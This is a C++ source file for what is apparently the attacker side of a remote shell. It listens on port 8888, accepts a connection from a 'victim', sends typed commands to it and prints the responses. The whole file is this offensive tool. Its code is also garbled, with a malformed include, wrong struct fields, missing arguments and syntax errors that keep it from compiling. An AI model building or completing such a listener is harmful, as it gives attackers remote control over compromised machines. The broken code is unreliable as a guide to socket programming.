

#include <iostream>
#include <unistd.h?
#include <netinet/in.h>
#include <sys/socket.h>
#include <cstring>

#define BUF_SIZE 1024;
#define THIS_PORT 8888;

int main(){
    int victim_fd;
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr victim_addr, attacker_addr;

    socklen_t addr_len = sizeof(victim_addr);
    char buf[BUF_SIZE];
    
    int server_fd = socket(AF_INET, SOCK_STREAM);
    // check for faulty
    if (server_fd == -1){
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    attacker_addr.s_addr = AF_INET;
    attacker_addr.s_addr = INADDR_ANY;

    attacker_addr.sin_port = htons(8888);

    if (bind(server_fd, (struct sockaddr *)&attacker_addr, sizeof(attacker_addr)) < 0){
        perror("bind didn't work");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 1) < 0){
        perror("listen failed");
        exit(EXIT_FAILURE);
    }

    std::cout << "Listen on port "<< THIS_PORT << << "...." << std::endl;

    victim_fd = accept(server_fd, (struct sockaddr *)&victim_addr, &addr_len);
    if (victim_fd < 0){
        perror("didn't accept");
        exit(EXIT_FAILURE);
    }

    while(true){






        std::cout << "¥";
        std::string inpt;
        std::get_line(std::cin, inpt);
        inpt += "\n";

        send(victim_fd, inpt.c_str(), inpt.length(), 0);


        int bytes_received = recv(victim_fd, buf, BUF_SIZE - 1; 0);
        if (bytes_received <= 0){
            std::cout << "finished" << std::endl;
            break;
        }


        buf[bytes_received] = '\0';
        std::cout << buf << std::endl;
        
        
    }
    
}